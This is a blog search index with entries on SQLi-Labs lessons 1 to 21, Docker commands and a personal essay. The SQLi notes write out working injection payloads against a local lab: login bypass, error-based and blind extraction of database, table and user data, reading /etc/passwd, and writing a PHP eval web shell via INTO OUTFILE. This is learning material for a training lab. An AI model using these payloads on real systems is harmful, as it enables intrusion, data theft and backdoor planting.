@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[SQLi-Labs学习笔记11~21]]></title>
+    <url>%2F2019%2F01%2F09%2FSQLi-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011-21%2F</url>
+    <content type="text"><![CDATA[小知识11、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】 Lesson-11/12 POST - Error Based uname=admin’ #&amp;passwd=dfdsf&amp;submit=Submit uname=admin’ and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) #&amp;passwd=dfdsf&amp;submit=Submit 两个字段都有注入，以上Lesson-11两个PoC的差别在于： 注释后面的SQL语句实现任意用户登录； 通过报错语句执行函数。 Lesson-12改为双引号加括号，无需赘言。 Lesson-8 Lesson-9/10 Time-based blind]]></content>
+      <categories>
+        <category>SQLi-Labs</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQLi-Labs学习笔记7~10]]></title>
+    <url>%2F2019%2F01%2F07%2FSQLi-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07-10%2F</url>
+    <content type="text"><![CDATA[小知识123写入一句话木马：id=223 union select &quot;&lt;?php &quot;,&quot; @eval($_POST[&apos;c&apos;]);&quot;, &quot; ?&gt;&quot; into outfile &quot;/var/www/html/mmm.php&quot; 常用路径有：/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www Lesson-7http://127.0.0.1:8088/Less-7/?id=id=223%20union%20select%20%22%3C?php%20%22,%22%20@eval($_POST[%27c%27]);%22,%20%22%20?%3E%22%20%20into%20%20outfile%20%22/var/www/html/mmm.php%22 结合提示”Use outfile”，可以知道题目可能是想让我们用导出文件的方法来做，于是我们可以写入一句话木马文件来做。 Lesson-8http://127.0.0.1:8088/Less-8/?id=1%27%20and%201=2%20%23 这个和之前的Lesson-5类似，正确查询显示You are in ……，错误查询不显示。 查询当前数据库名的长度?id=1’ and length(database())=8%23 经尝试，当前数据库名长的为8。 对数据库名的每个字符进行猜解?id=1’ and ascii(substring(database(),1,1))=115%23 -&gt; s?id=1’ and ascii(substring(database(),2,1))=101%23 -&gt; e?id=1’ and ascii(substring(database(),3,1))=99%23 -&gt; c?id=1’ and ascii(substring(database(),4,1))=117%23 -&gt; u?id=1’ and ascii(substring(database(),5,1))=114%23 -&gt; r?id=1’ and ascii(substring(database(),6,1))=105%23 -&gt; i?id=1’ and ascii(substring(database(),7,1))=116%23 -&gt; t?id=1’ and ascii(substring(database(),8,1))=121%23 -&gt; y得到当前数据库名：security 查询security数据库下的表的个数?id=1’ and (select count(table_name) from information_schema.tables where table_schema=’security’)=4%23经尝试，发现有4个表。 4.查询每个表的名字长度?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=”security” limit 0,1),6,1))%23对 内的数字进行变化，找到最大能显示正确的数字，那就是第一个表的长度然后更换 内的数字，继续查看另外几个表的长度。 猜解表的名字?id=1’ and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101%23 -&gt; e?id=1’ and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109%23 -&gt; m?id=1’ and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=97%23 -&gt; a?id=1’ and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=105%23 -&gt; i?id=1’ and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=105%23 -&gt; l 这里，我们猜解得到第一张表的名字为email，同理，我们可以猜解得到另外三张表名为referers、uagents、users。接下来猜解每个表里的列的个数、列名长度、列名，字段个数、字段长度、字段值，和上面原理都差不多，不再赘述。 猜解某个表下的列的个数?id=1’ and (select count(column_name) from information_schema.columns where table_name=’users’)= %d %23 7.猜解某个表下的列的长度?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))%23 猜解某个表下的某个列的名字?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97%23 猜解表下的某个列的某个字段的个数?id=1’ and (select count(username) from security.users)=13%23 猜解表下的某个列的某个字段的长度?id=1’ and ascii(substr((select username from security.users limit 0,1),1,1))%23 猜解表下的某个列的某个字段的值?id=1’ and ascii(substr((select username from security.users limit 0,1),1,1))=68%23 Lesson-9/10 Time-based blindhttp://127.0.0.1:8088/Less-9/?id=1%27%20and%20if(length(database())=8,sleep(5),null)%20%23 http://127.0.0.1:8088/Less-10/？id=1%22%20and%20if(length(database())=8,sleep(5),null)%20%23 基于时间延迟注入，要是我们猜测的语句是对的话，那么就会明显感觉到延迟，没有的话则说明猜测的信息有误。Lesson-10为双引号，仅此而已。]]></content>
+      <categories>
+        <category>SQLi-Labs</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQLi-Labs学习笔记1~6]]></title>
+    <url>%2F2019%2F01%2F07%2FSQLi-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-6%2F</url>
+    <content type="text"><![CDATA[小知识12345678%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&gt; &quot; %23 -&gt; # 直接在浏览器中执行，要使用必须写%23%25 -&gt; %%27 -&gt; &apos;注:1. 做注释使用#放在地址栏必须编码%232. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+ 正文Lesson-1/4http://127.0.0.1:8088/Less-1/?id=-1%27%20union%20select%201,2,3%20%23 http://127.0.0.1:8088/Less-2/?id=-1%20union%20select%201,2,3%20%23 http://127.0.0.1:8088/Less-3/?id=-1%27)%20union%20select%201,2,3%20%23 http://127.0.0.1:8088/Less-4/?id=-1%22)%20union%20select%201,2,3%20%23 这种基于报错类型的注入，先要确定报错特殊符号，然后找回显点。 正常显示，加单引号后报错，试到?id=1’ or ‘1’=’1时正常显示。 这时我们再尝试下注释语句，得出以下语句也是成功的。 ?id=1’ or 1=1 –%20?id=1’ or 1=1%23 思路使用oder by查询字段?id=1’ order by 5%23 采用折半查找，找到一个最大的不报错的数字，则为该表的字段长度，这里为3。 查询回显点?id=-1’ union select 1,2,3%23 图片中只回显2，3，可知回显点为第二、第三个字段，所以我们之后查询的内容要放在第二、第三字段才会显示。 Lesson-2是数值型； Lesson-3加了括号； Lesson-4字符加了括号。 Lesson-5/6http://127.0.0.1:8088/Less-5/?id=1%27%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+ http://127.0.0.1:8088/Less-6/?id=1%22%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+ 这里查询正确显示You are in………..，查询错误则不显示内容，报错正常显示。这里用Double SQL Injection(双查询注入) ，常用的报错函数如下： 1234561.floorand (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); --+2.ExtractValueand extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); --+3.UpdateXmland 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) --+ Lesson-5/6就是单双引号的差别。 MySQL常用查询1234567891011121314151617181920基本查询数据库版本：version()当前数据库：database()当前用户：user()os版本：@@version_compile_os数据库路径：@@basedir用冒号连接：concat_ws(char(32,58,32),user(),database(),version())文件读取：load_file(&apos;/etc/passwd&apos;)查询所有数据库(select group_concat(schema_name) from information_schema.schemata)依据数据库查询表名(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)依据数据库、表名查询列名(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)查询用户名密码(select group_concat(username separator &apos;;&apos;) from users),(select group_concat(password separator &apos;;&apos;) from users)]]></content>
+      <categories>
+        <category>SQLi-Labs</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Docker个人笔记]]></title>
+    <url>%2F2019%2F01%2F02%2FDocker%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0%2F</url>
+    <content type="text"><![CDATA[Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似iPhone的app）,更重要的是容器性能开销极低。 镜像篇 增加镜像： 到docker hub下载 或者 docker search xxx docker pull xxx 查询本地镜像：docker images 删除本地镜像：docker rmi xxx 容器篇 查看运行容器：docker ps 查看所有容器：docker ps -as 运行容器：docker start -i xxx 进入容器：docker exec -it 7f6dca80b660 /bin/bash 停止容器：docker stop xxx 停止所有容器：docker stop $(docker ps -q) 删除容器：docker rm -f xxx 删除所有容器：docker rm $(docker ps -aq)]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[恰同学少年]]></title>
+    <url>%2F2018%2F12%2F28%2F%E6%81%B0%E5%90%8C%E5%AD%A6%E5%B0%91%E5%B9%B4%2F</url>
+    <content type="text"><![CDATA[引言如果一切都可以重来，你会选择怎样的开始？ 遥远的Ta如果你有兴趣继续看下去，也许也会有耐心听我介绍自己的过去：一个遥远的过去，犹如梦境中的清晨，晶莹剔透的雨滴，顺着老屋的瓦，缓缓坠入沟渠。那是一个仿佛已经很久远的年代。那时候的村庄，没有手机，没有互联网，也没有“非常6+1”的幸运观众。有的只是青山，有的只是小溪，还有傍晚夕阳西下时升起的袅袅炊烟。而我，就是在这个宛如与世隔绝的村庄，度过了人生最初的十年。 邂逅死亡在记忆中某个已褪色的冬天，暴雨过后河水暴涨，叫嚣着漫过河堤，淹没原野。当时的我穿着厚重的大棉衣，流着鼻涕，一个人在河堤上慢慢地走着。已经记不清当时为什么要沿着河堤走(回家)，只记得脚下的河堤突然垮了，一脚踏空的我掉入洪水中。而周围，一个人都没有。 河水咆哮着灌入我的衣服里，发出类似于往玻璃瓶中倒水的声音。我下意识地往岸边游去，伸出手想要抓住什么。然而，洪水却以更快的速度把我往下游推。当时年幼的我头脑一片空白，意识到“我可能会死”。 死亡对一个孩子来说，意味着什么？我不知道，只是感到一股难以抵抗的恐惧感，唯一能做的就是臣服于本能 —— 我猛地把头扎入冰冷的水中，使出了全身的力气，以潜泳的方式拼命地往岸边游去终于，我抓住了什么东西，顺势爬上了岸边，像一条落水狗一样，趴在岸边喘着粗气、瑟瑟发抖。 平凡之路也许是因为那段宛如梦境的经历，让我的整个求学生涯都伴随着某种形式上的孤独感。虽然已经记不清楚，自己怎么一个人走过来的。整个求学期间，“不合群”给别人的最大感觉。与其说“不合群”，不如说“气质不对”（主要看气质）—— 大概给人一种“看不出有什么太奇怪，但就是和我们不一样”的感觉吧。于是乎，我一个人去看书、一个人去长跑、一个人去做那些可以一个人能做好的事情。在读书期间，孤独给我的不止是夜间路灯下那个形单影只的背影，还有某种程度上的钝感。后来，依赖着类似于堂吉诃德式的勇气，我走完了整个小初高中，走向了大学。 而我的大学，并没有让我达到某个方面某种质的飞跃，也没有什么专业性积累，这也算是某种程度上的虚度光阴吧。在大学期间，开始逐渐接触到这么一种说法，即“为编程而生”。 你不仅得有天赋，还得具备激情，才能成为一名优秀的程序员。…好像那些写代码的人是早就决定干这一行似的，“当他们还是孩子的时候，他们就打算将来去写代码”。如果你缺少这两个因素之一，那么你要么是一个骗子，要么不会走得太远。 我从来都不觉得自己有过什么天赋，更不会有那种“为编程而生”的感觉。在专业课学得不好的时候，也会怀疑自己是不是选错专业了。然而，地球在转动，生活也要继续，我唯一能做的，就是学好专业知识，以期毕业后能混口饭吃。既然已经选择，又无讨价的余地，唯有硬着头皮上了。既便如此，“闭门造车”坏习惯很快成为我的拦路虎，整个大学都是重复“上课睡觉，考前预习”的模式。在挂了几科后，甚至一度怀疑自己能否顺利毕业，也算是“学渣”的烦恼吧。直到后来接触到鱼C，才觉得稍微有点编程姿态，也渐渐有点程序员的样子。 言及方法，也许是因为社会节奏越来越快，社会上弥漫着一股类似于“方法不对，努力白费”、“如果方向错了，停止就是进步”的言论。浮躁让我们把注重点放在“方法”、“秘诀”之类的捷径上，而忽略了努力本身。试想，从小喝的鸡汤，对我们的进步是否真的有所帮助？ 今年七月初，我只身一人飞到深圳，这个从未涉足的城市。从没有想过要“出任CEO，迎娶白富美，走向人生巅峰”，只想着怎么自力更生，养活自己。快3个月过去了，我很幸运地找到了一份工作，和无数慕名而来的年轻人一样，挥洒着自己的汗水，为了一个可能更美好的明天奋斗着。 后记回到最开始的问题“如果一切都可以重来，你会选择怎样的开始？现在跳到另一个问题“如果一切都只能继续，你会选择怎样的继续？” 众里寻她，如果找到的只是无奈，你是否继续等待？蓦然回首，如果剩下的只有苍白，你是否能够释怀？ 执着于自己的执着，落寞于自己的错过，带着伤痛和坚毅，每个人都能走得更远。]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随の想</tag>
+      </tags>
+  </entry>
+</search>
